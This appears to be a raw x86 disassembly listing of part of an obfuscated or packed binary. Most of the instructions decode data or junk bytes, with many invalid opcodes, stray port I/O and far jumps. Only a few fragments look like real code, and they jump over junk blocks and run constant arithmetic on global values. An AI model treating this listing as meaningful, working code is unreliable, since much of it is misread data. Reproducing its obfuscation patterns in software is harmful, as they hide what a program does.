  406c1e:	jmp    0xbb04:0x693b7216
  406c25:	mov    ds:0xd71b4ca8,al
  406c2a:	sub    eax,0xfd8718c8
  406c2f:	test   BYTE PTR ds:0x757244b8,cl
  406c35:	retf   
  406c36:	dec    edx
  406c37:	pop    ds
  406c38:	add    BYTE PTR [ecx+0x70],ah
  406c3b:	enter  0x552d,0xf1
  406c3f:	lock and BYTE PTR [edx+0x5e],0xb3
  406c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c45:	cdq    
  406c46:	aaa    
  406c47:	leave  
  406c48:	sub    bh,bh
  406c4a:	mov    esp,DWORD PTR [edx]
  406c4c:	sub    DWORD PTR [edx-0x6993df87],0xb81d330c
  406c56:	int    0x1a
  406c58:	mov    bl,0xb6
  406c5a:	addr16 cwde 
  406c5c:	icebp  
  406c5d:	mov    edi,es
  406c5f:	out    dx,eax
  406c60:	cmp    al,0x96
  406c62:	mov    ebx,0x59cf26b6
  406c67:	mov    fs,ecx
  406c69:	mov    al,0xf3
  406c6b:	xor    eax,0x3ecb3d9
  406c70:	(bad)  
  406c72:	sar    edx,0x8c
  406c75:	dec    ecx
  406c76:	jle    0x406caa
  406c78:	dec    edx
  406c79:	rep lods al,BYTE PTR ds:[esi]
  406c7b:	push   0x9e65da13
  406c80:	je     0x406ce8
  406c82:	jbe    0x406cdb
  406c84:	leave  
  406c85:	or     al,0x4a
  406c87:	push   ss
  406c88:	jb     0x406cc4
  406c8a:	and    al,0xb8
  406c8c:	outs   dx,BYTE PTR ds:[esi]
  406c8d:	jle    0x406ce4
  406c8f:	push   esi
  406c90:	mov    al,ch
  406c92:	xor    dh,BYTE PTR [ecx]
  406c94:	les    ebp,FWORD PTR [esi-0x6bef7f62]
  406c9a:	mov    edx,0x95ce8126
  406c9f:	xchg   edi,eax
  406ca0:	cmp    edx,DWORD PTR [esi-0x2f]
  406ca3:	dec    edi
  406ca4:	jns    0x406cc8
  406ca6:	mov    WORD PTR [edx-0x135b431b],?
  406cac:	push   ss
  406cad:	mov    esi,0x6103dfaa
  406cb2:	mov    edx,0x2a505d93
  406cb7:	mov    esp,0x1f3a7344
  406cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cbd:	dec    esp
  406cbe:	out    0xff,al
  406cc0:	adc    ecx,DWORD PTR [edi+esi*4]
  406cc3:	sar    BYTE PTR [ecx-0x1f7fbebe],cl
  406cc9:	jb     0x406c57
  406ccb:	cmp    ah,BYTE PTR [eax-0x1b]
  406cce:	or     ebx,0x63fc0183
  406cd4:	cld    
  406cd5:	in     eax,dx
  406cd6:	mov    ss,WORD PTR [edi+0x50060c6f]
  406cdc:	call   0x370b:0xeeacae4b
  406ce3:	in     eax,dx
  406ce4:	mov    ecx,DWORD PTR [ebx]
  406ce6:	xchg   edi,eax
  406ce7:	sqrtps xmm3,xmm3
  406cea:	xchg   edi,eax
  406ceb:	xor    DWORD PTR [eax],ebx
  406ced:	cmp    ebx,esp
  406cef:	lahf   
  406cf0:	scas   al,BYTE PTR es:[edi]
  406cf1:	(bad)  
  406cf2:	out    0x68,al
  406cf4:	push   ds
  406cf5:	retf   
  406cf6:	fdiv   st(6),st
  406cf8:	dec    eax
  406cf9:	retf   
  406cfa:	xor    ebx,ebp
  406cfc:	(bad)  
  406cfd:	aad    0xc6
  406cff:	jnp    0x406d05
  406d01:	jne    0x406d2e
  406d03:	test   al,0xe4
  406d05:	adc    bh,BYTE PTR [edx-0x68c9772f]
  406d0b:	repnz lods al,BYTE PTR ds:[esi]
  406d0d:	pop    edx
  406d0e:	je     0x406cad
  406d10:	pop    esi
  406d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d12:	pop    ecx
  406d13:	and    eax,0xd5dc5322
  406d18:	int    0x1b
  406d1a:	cmp    BYTE PTR [ecx+0x1e95db83],ch
  406d20:	scas   eax,DWORD PTR es:[edi]
  406d21:	add    al,BYTE PTR [ebp+0x58]
  406d24:	mov    ebx,DWORD PTR [edx]
  406d26:	ins    DWORD PTR es:[edi],dx
  406d27:	mov    esp,0xfd23d4b4
  406d2c:	mov    ds:0xdd7a5faf,eax
  406d31:	scas   eax,DWORD PTR es:[edi]
  406d32:	stos   DWORD PTR es:[edi],eax
  406d33:	(bad)  [edx+0x2c]
  406d36:	call   0xd5e2773e
  406d3b:	xor    BYTE PTR [edi+0x71],0x39
  406d3f:	mov    ch,0xdc
  406d41:	scas   eax,DWORD PTR es:[edi]
  406d42:	jecxz  0x406ce0
  406d44:	ret    0x88e7
  406d47:	xor    ch,BYTE PTR [esp+ebx*2+0x75]
  406d4b:	mov    bl,0xec
  406d4d:	ret    0xf14a
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x4338af,0x433793
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x4338a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4337e3,0x43378f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x28
  406d91:	stos   BYTE PTR es:[edi],al
  406d92:	fwait
  406d93:	in     eax,dx
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xee7e7e7f
  406d9d:	or     eax,DWORD PTR [edi-0x7a]
  406da0:	pop    edi
  406da1:	xchg   BYTE PTR [esi],dh
  406da3:	push   es
  406da4:	in     eax,dx
  406da5:	cdq    
  406da6:	push   ebx
  406da7:	adc    DWORD PTR [edx],ebx
  406da9:	jmp    0x406d94
  406dab:	or     al,0xc9
  406dad:	pop    esi
  406dae:	leave  
  406daf:	push   eax
  406db0:	or     eax,0xe68c81da
  406db5:	sub    edi,ebx
  406db7:	test   BYTE PTR [edx+0x21],0x39
  406dbb:	iret   
  406dbc:	(bad)
  406dc0:	inc    BYTE PTR ss:[edi+0x6b26b248]
  406dc7:	xchg   esp,eax
  406dc8:	pop    ebx
  406dc9:	jnp    0x406dae
  406dcb:	iret   
  406dcc:	scas   eax,DWORD PTR es:[edi]
  406dcd:	in     eax,dx
  406dce:	mov    dh,0xc3
  406dd0:	sub    al,0xc5
  406dd2:	bound  ebx,QWORD PTR [ebx]
  406dd4:	inc    ebp
  406dd5:	inc    ecx
  406dd6:	jge    0x406da8
  406dd8:	hlt    
  406dd9:	in     al,dx
  406dda:	out    dx,eax
  406ddb:	jecxz  0x406dff
  406ddd:	cwde   
  406dde:	and    eax,0x8c43973a
  406de3:	jae    0x406da4
  406de5:	dec    eax
  406de6:	push   cs
  406de7:	xchg   esi,eax
  406de8:	sahf   
  406de9:	dec    esi
  406dea:	push   ebp
  406deb:	or     eax,0x4beed04a
  406df0:	shl    BYTE PTR [edi],1
  406df2:	sbb    esp,DWORD PTR [eax]
  406df4:	(bad)  
  406df5:	push   esi
  406df6:	shl    DWORD PTR [esi],cl
  406df8:	aas    
  406df9:	jno    0x406da4
  406dfb:	adc    esi,DWORD PTR [edi-0xa]
  406dfe:	scas   al,BYTE PTR es:[edi]
  406dff:	loop   0x406e65
  406e01:	adc    ch,BYTE PTR [esi+0x78611e7b]
  406e07:	push   ebp
  406e08:	inc    edx
  406e09:	push   0x33
  406e0b:	sahf   
  406e0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e0d:	xchg   ebx,eax
  406e0e:	jl     0x406e5d
  406e10:	dec    ecx
  406e11:	mov    ecx,0x1f480a74
  406e16:	mov    edi,0xaaf1275a
  406e1b:	push   ebp
  406e1c:	sub    eax,0x1ee67ace
  406e21:	cmp    eax,0x604638e4
  406e26:	repnz cmp eax,0xb98b5c62
  406e2c:	pop    ds
  406e2d:	pop    es
  406e2e:	xor    ebp,ebp
  406e30:	sahf   
  406e31:	inc    ebx
  406e32:	fldcw  WORD PTR [eax+0x4ce96f3e]
  406e38:	(bad)  [esi+0x4c]
  406e3b:	das    
  406e3c:	mov    ss,WORD PTR [ebx]
  406e3e:	aaa    
  406e3f:	sti    
  406e40:	sbb    al,0xa
  406e42:	cmp    al,0xf5
  406e44:	add    eax,0xc7c39c26
  406e49:	mov    ebx,0x5154b2f6
  406e4e:	ret    
  406e4f:	or     bh,dh
  406e51:	(bad)  
  406e52:	in     eax,0xbf
  406e54:	jmp    0x833e:0x7901b77d
  406e5b:	cmp    al,0x68
  406e5d:	xor    eax,0xa167721b
  406e62:	mov    edx,DWORD PTR [ecx+0x5924119d]
  406e68:	xor    al,0x5c
  406e6a:	adc    BYTE PTR [esi-0x5d],ch
  406e6d:	pop    edx
  406e6e:	jle    0x406e13
  406e70:	cmp    eax,0x5cd81d6a
  406e75:	loop   0x406ec3
  406e77:	push   esp
  406e78:	xor    ah,BYTE PTR [esi]
  406e7a:	sub    al,0xa1
  406e7c:	ss and al,0x5
  406e7f:	mov    WORD PTR [ebp+0x756f95de],?
  406e85:	xchg   ecx,eax
  406e86:	mov    ds:0xff9f455a,eax
  406e8b:	out    dx,al
  406e8c:	inc    eax
  406e8d:	dec    esp
  406e8e:	push   ss
  406e8f:	int3   
  406e90:	adc    DWORD PTR [eax],edi
  406e92:	sub    edi,DWORD PTR [ebx]
  406e94:	xchg   DWORD PTR [edi],ecx
  406e96:	loopne 0x406ee6
  406e98:	out    0x61,eax
  406e9a:	add    ah,BYTE PTR [eax]
  406e9c:	jg     0x406e1e
  406e9e:	enter  0xea36,0x46
  406ea2:	sar    DWORD PTR [edi],1
  406ea4:	adc    al,0x29
  406ea6:	and    BYTE PTR [edi],al
  406ea8:	pop    esp
  406ea9:	loope  0x406f1c
  406eab:	pop    eax
  406eac:	sbb    al,0x27
  406eae:	loope  0x406e7b
  406eb0:	jbe    0x406f2c
  406eb2:	add    ecx,DWORD PTR [esi-0x10607818]
  406eb8:	mov    ah,0xae
  406eba:	cli    
  406ebb:	cs xchg ecx,eax
  406ebd:	mov    dl,0xdc
  406ebf:	dec    ecx
  406ec0:	jb     0x406eb0
  406ec2:	xchg   edx,eax
  406ec3:	jmp    0x406e6e
  406ec5:	jne    0x406e80
  406ec7:	push   ecx
  406ec8:	xchg   BYTE PTR [esi-0x20153f7],bh
  406ece:	sar    BYTE PTR [ebx+eax*4],0x29
  406ed2:	mov    ch,0x49
  406ed4:	scas   eax,DWORD PTR es:[edi]
  406ed5:	bound  edi,QWORD PTR ds:0x5e8793ec
  406edb:	scas   eax,DWORD PTR es:[edi]
  406edc:	shr    edi,cl
  406ede:	imul   eax,DWORD PTR [ecx+0x60d6524c],0xffffff8f
  406ee5:	xor    esp,DWORD PTR [edi]
  406ee7:	lods   eax,DWORD PTR ds:[esi]
  406ee8:	in     eax,0xd
  406eea:	dec    ecx
  406eeb:	jmp    FWORD PTR [edx]
  406eed:	fdivr  DWORD PTR [edx]
  406eef:	int    0x2
  406ef1:	dec    esi
  406ef2:	xchg   edx,eax
  406ef3:	mov    al,0xe9
  406ef5:	pop    ds
  406ef6:	mov    ds:0xc071b1cb,eax
  406efb:	ds jne 0x406e7e
  406efe:	sbb    al,0xac
  406f00:	adc    BYTE PTR [ecx-0x6c497277],bl
  406f06:	xor    BYTE PTR [ebp+0x4b],ch
  406f09:	(bad)  
  406f0a:	cmc    
  406f0b:	icebp  
  406f0c:	shl    DWORD PTR [ebp+0x5f01e275],1
  406f12:	mov    ebx,0x5da4c115
  406f17:	xchg   esi,eax
  406f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f19:	mov    ds,WORD PTR [ebx-0x14087a6f]
  406f1f:	jmp    FWORD PTR [esp+ebp*1]
  406f22:	pop    edx
  406f23:	sbb    al,0x13
  406f25:	cli    
  406f26:	test   al,0xb
  406f28:	sbb    al,0x5c
  406f2a:	aas    
  406f2b:	test   al,0xa3
  406f2d:	xor    DWORD PTR [eax],eax
  406f2f:	xor    al,0xef
  406f31:	in     eax,dx
  406f32:	add    esi,ebx
  406f34:	pop    edx
  406f35:	arpl   cx,bp
  406f37:	fisttp DWORD PTR [edi]
  406f39:	push   esi
  406f3a:	cld    
  406f3b:	ja     0x406f88
  406f3d:	mov    ah,0x7f
  406f3f:	mov    ds:0xf575fd9d,eax
  406f44:	pop    ebp
  406f45:	xchg   edx,eax
  406f46:	push   es
  406f47:	out    0xd7,eax
  406f49:	lock mov edi,0x35c866c9
  406f4f:	outs   dx,BYTE PTR ds:[esi]
  406f50:	sub    al,0xfe
  406f52:	lods   eax,DWORD PTR ds:[esi]
  406f53:	and    DWORD PTR [edx+0x58],esp
  406f56:	push   edx
  406f57:	xchg   edx,eax
  406f58:	out    0xcd,eax
  406f5a:	mov    ebp,DWORD PTR [edi+0x58]
  406f5d:	repnz not eax
  406f60:	and    DWORD PTR ds:0x43378f,0x4337d3
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xb219724c
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x767e7e7f
  406f9f:	ret    
  406fa0:	fist   DWORD PTR [ebp+esi*8+0x4f]
  406fa4:	mov    ch,BYTE PTR [edi-0x80]
  406fa7:	mov    cl,0x1e
  406fa9:	xor    dh,BYTE PTR ds:0x50960d67
  406faf:	mov    edx,DWORD PTR [ecx+0xed7511c]
  406fb5:	lds    esp,FWORD PTR [ebx-0x193f7f35]
  406fbb:	cmp    ch,BYTE PTR [ecx-0x45271469]
  406fc1:	mov    dh,0xdb
  406fc3:	jns    0x406f58
  406fc5:	gs jne 0x406f4d
  406fc8:	pop    esi
  406fc9:	mov    bl,0xb0
  406fcb:	jmp    0x407008
  406fcd:	and    al,dh
  406fcf:	leave  
  406fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fd1:	mov    al,ds:0x706011e
  406fd6:	lods   al,BYTE PTR ds:[esi]
  406fd7:	pop    ecx
  406fd8:	or     BYTE PTR [ecx-0x59bf5d27],al
  406fde:	mov    esi,0x3109fd92
  406fe3:	or     BYTE PTR [edx+ecx*8+0x25be34b6],cl
  406fea:	rcl    DWORD PTR [ebp-0x3b],cl
  406fed:	pop    eax
  406fee:	push   es
  406fef:	inc    ebp
  406ff0:	scas   al,BYTE PTR es:[edi]
  406ff1:	ins    DWORD PTR es:[edi],dx
  406ff2:	cld    
  406ff3:	hlt    
  406ff4:	jge    0x407000
  406ff6:	mov    ds:0x96af6d5c,eax
  406ffb:	shl    BYTE PTR es:[esi-0x7b],0xea
  407000:	or     eax,0xee4161ec
  407005:	ja     0x407060
  407007:	push   ebp
  407008:	jle    0x406fcd
  40700a:	call   0x3d5c:0xf05ffb56
  407011:	xchg   edi,eax
  407012:	jae    0x406fd5
  407014:	and    BYTE PTR [edx+0x65],0xd1
  407018:	addr16 stc 
  40701a:	pop    esi
  40701b:	jle    0x407080
  40701d:	jo     0x407029
  40701f:	xlat   BYTE PTR ds:[ebx]
  407020:	mov    ds:0x313dde3d,al
  407025:	pop    edx
  407026:	inc    ebp
  407027:	scas   al,BYTE PTR es:[edi]
  407028:	jns    0x407008
  40702a:	cmp    al,0xc2
  40702c:	pop    ss
  40702d:	jmp    0xb32fcb
  407032:	enter  0xd19c,0xfd
  407036:	jmp    0x4890:0xc67b432b
  40703d:	fnsave [edi]
  40703f:	mov    WORD PTR [ebx-0x1f],cs
  407042:	leave  
  407043:	imul   BYTE PTR [eax+0x33]
  407046:	fs adc ebp,edx
  407049:	mov    al,0xff
  40704b:	mov    ecx,0x6371d2dc
  407050:	sub    DWORD PTR [esi],0xffffff95
  407053:	jns    0x407023
  407055:	sub    ah,BYTE PTR [ecx-0x23385b24]
  40705b:	and    eax,0x95efb58f
  407060:	aas    
  407061:	inc    ecx
  407062:	xchg   DWORD PTR [esi+0x1f],esi
  407065:	sti    
  407066:	add    eax,0x480ca15e
  40706b:	pop    esp
  40706c:	jo     0x407033
  40706e:	sbb    BYTE PTR [edx+0x4b],al
  407071:	(bad)  
  407072:	sbb    BYTE PTR [ebp+0x1028da55],ah
  407078:	(bad)  [ebx]
  40707a:	fwait
  40707b:	and    DWORD PTR [edx+0x2d],0xf23fa22b
  407082:	mov    edi,0x47703b56
  407087:	push   esi
  407088:	mov    ds:0xdd582490,al
  40708d:	sbb    al,0x1a
  40708f:	sbb    al,0xbc
  407091:	mov    ebx,0xfb848255
  407096:	iret   
  407097:	pushf  
  407098:	and    bl,dh
  40709a:	mov    cs,WORD PTR [edx]
  40709c:	retf   
  40709d:	(bad)  [ecx+0x3feb661b]
  4070a3:	mov    ebx,0x15cfc4cb
  4070a8:	mov    ebp,0x3c2451e1
  4070ad:	jmp    0x4070c6
  4070af:	sbb    ebx,DWORD PTR [edx]
  4070b1:	cmp    ebx,DWORD PTR [ebp-0x521fb202]
  4070b7:	sbb    ecx,DWORD PTR [edx+0x3a]
  4070ba:	int3   
  4070bb:	and    eax,0xa904c100
  4070c0:	shr    DWORD PTR [ebx+0xe7e97e3],cl
  4070c6:	xchg   esi,eax
  4070c7:	and    BYTE PTR [edi+ebp*2+0x1d71a160],0x54
  4070cf:	fwait
  4070d0:	jg     0x4070a1
  4070d2:	ins    DWORD PTR es:[edi],dx
  4070d3:	push   ds
  4070d4:	push   edx
  4070d5:	fsubr  QWORD PTR [edi]
  4070d7:	(bad)  
  4070d8:	cwde   
  4070d9:	xchg   edi,eax
  4070da:	dec    esi
  4070db:	mov    ah,0xff
  4070dd:	add    BYTE PTR [edx],0xf7
  4070e0:	loop   0x407088
  4070e2:	cs inc esi
  4070e4:	xchg   edx,eax
  4070e5:	sub    DWORD PTR [ebx+0x1b2464ac],ecx
  4070eb:	sub    DWORD PTR [ecx-0x4],ebx
  4070ee:	push   ds
  4070ef:	arpl   bx,cx
  4070f1:	mov    edx,0xdf541462
  4070f6:	pop    ds
  4070f7:	sub    ebp,ebp
  4070f9:	fcomp  QWORD PTR [ebx-0x6b]
  4070fc:	les    edi,FWORD PTR [eax-0x37]
  4070ff:	ins    DWORD PTR es:[edi],dx
  407100:	loop   0x4070ee
  407102:	ja     0x4070bf
  407104:	bound  ecx,QWORD PTR [ecx]
  407106:	or     BYTE PTR [edx],ch
  407108:	rol    edx,cl
  40710a:	ret    0x9d58
  40710d:	mov    esi,0x4be7e4a8
  407112:	and    al,0xba
  407114:	sub    dl,ch
  407116:	and    DWORD PTR [eax+0x9],ebx
  407119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40711a:	loopne 0x407181
  40711c:	imul   ebx,DWORD PTR [ebp+0x1447d05d],0x2
  407123:	jmp    0x72d8:0xb33bcdc8
  40712a:	inc    ebx
  40712b:	sbb    eax,0xb921d468
  407130:	or     bl,al
  407132:	push   cs
  407133:	out    0x71,al
  407135:	and    esp,edx
  407137:	lock jl 0x40710e
  40713a:	cs daa 
  40713c:	idiv   BYTE PTR [ecx]
  40713e:	repz sbb edx,DWORD PTR [edi+0x52]
  407142:	adc    esi,DWORD PTR [esi-0x4]
  407145:	fidivr WORD PTR [edx-0xabe5286]
  40714b:	pop    esi
  40714c:	or     eax,0x346c9aae
  407151:	aaa    
  407152:	pop    eax
  407153:	test   eax,0xea4964a1
  407158:	jbe    0x407133
  40715a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40715b:	pop    es
  40715c:	cmp    cl,ch
  40715e:	or     DWORD PTR [edx],ebx
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	pop    edx
  40717c:	jecxz  0x407168
  40717e:	repnz int3 
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xdd7e7e7f
  407188:	sub    DWORD PTR [eax+eiz*4],eax
  40718b:	mov    ecx,0x50c3fd0b
  407190:	inc    edx
  407191:	dec    edx
  407192:	div    DWORD PTR [ebx-0x69c75fed]
  407198:	jbe    0x4071bb
  40719a:	nop
  40719b:	adc    ah,BYTE PTR [edx-0x31]
  40719e:	cmp    ecx,DWORD PTR [esi]
  4071a0:	jae    0x407190
  4071a2:	fcmovne st,st(5)
  4071a4:	ss in  eax,0x20
  4071a7:	scas   al,BYTE PTR es:[edi]
  4071a8:	retf   
  4071a9:	xor    BYTE PTR [ebx+0x58],0x67
  4071ad:	gs inc eax
  4071af:	xchg   edi,ebp
  4071b1:	and    ebp,DWORD PTR [esp+edi*4]
  4071b4:	es js  0x4071fc
  4071b7:	dec    ebp
  4071b8:	addr16 or eax,0x4f00fffc
  4071be:	jb     0x4071c0
  4071c0:	pop    esi
  4071c1:	mov    edi,0xe26ac343
  4071c6:	out    dx,al
  4071c7:	out    0x88,eax
  4071c9:	call   0xc57d:0xf8f93186
  4071d0:	call   0x317506f6
  4071d5:	sar    BYTE PTR ds:0xc5cd8d3e,cl
  4071db:	std    
  4071dc:	and    eax,eax
  4071de:	leave  
  4071df:	xchg   ecx,eax
  4071e0:	or     eax,0x13fe8620
  4071e5:	jecxz  0x40718d
  4071e7:	push   ecx
  4071e8:	inc    esi
  4071e9:	jle    0x407170
  4071eb:	(bad)  
  4071ec:	push   esi
  4071ed:	dec    edx
  4071ee:	pop    ss
  4071ef:	pop    ss
  4071f0:	adc    al,BYTE PTR [edi-0x5623ba79]
  4071f6:	sub    cl,BYTE PTR [ecx]
  4071f8:	cld    
  4071f9:	(bad)  
  4071fa:	pop    esi
  4071fb:	dec    edx
  4071fc:	adc    eax,0x3cefef71
  407201:	adc    eax,0x5a8ff6ce
  407206:	and    esi,DWORD PTR [eax-0xc]
  407209:	mov    ebx,0x83e8b707
  40720e:	push   0x45
  407210:	test   ch,ah
  407212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407213:	cmp    DWORD PTR [edi-0x43453d40],edi
  407219:	lock add al,BYTE PTR [edi-0x44]
  40721d:	mov    ch,0xd1
  40721f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407220:	inc    esi
  407221:	sub    BYTE PTR [ebp+0x652c359f],dl
  407227:	mov    ch,0x3
  407229:	and    DWORD PTR [edi+eiz*8-0x510e4473],0x70
  407231:	mov    esp,0x7b32b1e3
  407236:	mov    esi,0x7130502f
  40723b:	xor    al,0x2e
  40723d:	jb     0x4072ae
  40723f:	adc    eax,0x17e95325
  407244:	jl     0x407251
  407246:	mov    eax,0x75205513
  40724b:	sbb    dh,BYTE PTR [ecx]
  40724d:	std    
  40724e:	les    eax,FWORD PTR ds:0xd466e6a3
  407254:	pop    edi
  407255:	ins    DWORD PTR es:[edi],dx
  407256:	aam    0xec
  407258:	jno    0x407292
  40725a:	jae    0x407289
  40725c:	outs   dx,DWORD PTR ds:[esi]
  40725d:	ja     0x4072b8
  40725f:	pop    es
  407260:	je     0x4071fc
  407262:	xchg   ebp,eax
  407263:	ficom  DWORD PTR [edx]
  407265:	xor    edi,DWORD PTR [ecx*4+0x6449e2e4]
  40726c:	pop    ebp
  40726d:	add    eax,0x6ac87c12
  407272:	xchg   BYTE PTR [edi+0x5d74a5bb],al
  407278:	pop    es
  407279:	or     BYTE PTR [eax-0x7b],0xdd
  40727d:	inc    ebx
  40727e:	cld    
  40727f:	mov    WORD PTR [edi-0x7d479bfb],ss
  407285:	dec    ebp
  407286:	xor    al,0x46
  407288:	lds    esp,FWORD PTR [esi+0x4effe721]
  40728e:	mov    ebp,0xf6c40a72
  407293:	inc    ecx
  407294:	cli    
  407295:	sub    ecx,ebp
  407297:	sub    edx,esi
  407299:	loope  0x40731a
  40729b:	stos   DWORD PTR es:[edi],eax
  40729c:	mov    DWORD PTR [eax],esi
  40729e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40729f:	std    
  4072a0:	mov    edi,0xe69c0c41
  4072a5:	retf   
  4072a6:	xchg   DWORD PTR [ecx],ebp
  4072a8:	or     dh,al
  4072aa:	cwde   
  4072ab:	gs pop eax
  4072ad:	inc    ebx
  4072ae:	popa   
  4072af:	imul   esi,edi,0xe4c19f3
  4072b5:	mul    DWORD PTR [esi]
  4072b7:	gs push ecx
  4072b9:	mov    ah,0x1f
  4072bb:	shl    DWORD PTR [ebx-0xd84c43a],1
  4072c1:	jb     0x40733c
  4072c3:	xchg   ebp,eax
  4072c4:	mov    esp,DWORD PTR [ebp-0x5c]
  4072c7:	dec    ebp
  4072c8:	frstor [ebp-0x37de16]
  4072ce:	dec    eax
  4072cf:	ja     0x4072c6
  4072d1:	cwde   
  4072d2:	xor    BYTE PTR [edx+0x7f8d9576],ah
  4072d8:	jbe    0x4072ed
  4072da:	mov    ecx,0x78e533fe
  4072df:	outs   dx,DWORD PTR ds:[esi]
  4072e0:	ja     0x407357
  4072e2:	int3   
  4072e3:	cmp    al,0x8a
  4072e5:	xchg   edi,eax
  4072e6:	lea    esp,[ebx-0x3b]
  4072e9:	es jno 0x407325
  4072ec:	inc    edx
  4072ed:	push   es
  4072ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072ef:	xor    BYTE PTR [ebp-0x60c5b4f3],ah
  4072f5:	clc    
  4072f6:	mov    dh,0x7b
  4072f8:	jo     0x4072fa
  4072fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072fb:	retf   
  4072fc:	xchg   edi,eax
  4072fd:	jle    0x40728d
  4072ff:	inc    esp
  407300:	loop   0x407375
  407302:	mov    bl,0xc9
  407304:	xchg   ebx,eax
  407305:	out    0x7d,al
  407307:	push   ds
  407308:	retf   0x221c
  40730b:	cli    
  40730c:	aad    0xbc
  40730e:	dec    edi
  40730f:	sar    edi,cl
  407311:	push   edx
  407312:	pop    ebx
  407313:	mov    edi,0xe6b770f
  407318:	(bad)  
  407319:	call   0x84a0:0x1424d5e0
  407320:	adc    eax,0xfad3fb27
  407325:	jbe    0x407352
  407327:	rcl    DWORD PTR [ebx*4-0x68fafbad],0x25
  40732f:	in     eax,dx
  407330:	call   FWORD PTR [ebx-0x41b25d32]
  407336:	cmp    eax,esi
  407338:	push   es
  407339:	ror    BYTE PTR [ebx+0x33],0x86
  40733d:	fadd   QWORD PTR [esi]
  40733f:	push   eax
  407340:	mul    ebp
  407342:	mov    ch,0xee
  407344:	(bad)  
  407345:	rcl    esi,cl
  407347:	rcr    BYTE PTR [ebx],1
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4337d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4338ab
  40736f:	or     DWORD PTR ds:0x4338af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x40736f
  407387:	lea    esp,[ebx+0x6a]
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0xf7e7e7c
  407393:	(bad)  
  407394:	mov    eax,ds:0x68790a0
  407399:	lods   eax,DWORD PTR ds:[esi]
  40739a:	gs jae 0x4073a1
  40739d:	pop    ds
  40739e:	push   0xab1506c2
  4073a3:	xchg   ecx,eax
  4073a4:	retf   
  4073a5:	(bad)  
  4073a6:	in     eax,dx
  4073a7:	ds ds inc ebp
  4073aa:	clc    
  4073ab:	pop    ds
  4073ac:	fwait
  4073ad:	xor    edi,DWORD PTR [eax-0x72]
  4073b0:	push   0x7c
  4073b2:	cmp    edx,DWORD PTR [esp+ebx*8]
  4073b5:	inc    bx
  4073b7:	xor    al,0xf9
  4073b9:	retf   
  4073ba:	aad    0x1
  4073bc:	pop    ecx
  4073bd:	mov    ebx,0x921767e
  4073c2:	fwait
  4073c3:	or     edx,DWORD PTR [ebp+0x7]
  4073c6:	(bad)  
  4073c7:	psubw  mm0,QWORD PTR [ecx+0x1f]
  4073cb:	xchg   BYTE PTR [eax-0xf],ah
  4073ce:	dec    ecx
  4073cf:	pop    ss
  4073d0:	call   ecx
  4073d2:	pop    ebp
  4073d3:	scas   al,BYTE PTR es:[edi]
  4073d4:	popf   
  4073d5:	int3   
  4073d6:	(bad)  
  4073d7:	imul   edi,DWORD PTR [edi],0xffffffb7
  4073da:	push   0x6
  4073dc:	test   DWORD PTR [ecx],0x1c17168c
  4073e2:	mov    ds:0x30f84e9b,eax
  4073e7:	imul   edx,ebp,0xffffffab
  4073ea:	dec    esp
  4073eb:	clc    
  4073ec:	into   
  4073ed:	sub    DWORD PTR [eax-0x72f80817],esi
  4073f3:	dec    esp
  4073f4:	mov    ebp,0xd8236d13
  4073f9:	cli    
  4073fa:	lods   eax,DWORD PTR ds:[esi]
  4073fb:	int    0xe2
  4073fd:	sub    DWORD PTR [edi+0x72137ded],0xfffffff4
  407404:	enter  0x604f,0xe8
  407408:	sti    
